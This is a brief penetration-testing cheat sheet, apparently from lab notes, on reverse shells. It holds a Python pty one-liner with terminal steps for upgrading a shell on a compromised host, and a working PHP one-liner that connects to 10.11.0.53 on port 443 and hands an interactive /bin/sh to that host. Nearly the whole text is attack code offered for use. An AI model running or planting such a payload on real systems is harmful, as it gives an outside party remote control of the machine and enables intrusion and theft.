# Reverse Shells

### Upgrade your shell, upgrade your life

```bash
# On compromised host
python -c 'import pty; pty.spawn("/bin/bash")'
# ctrl-z

# While terminal session backgrounded
stty raw -echo
fg
```

### PHP

```php
<?php $sock=fsockopen("10.11.0.53", 443); proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```



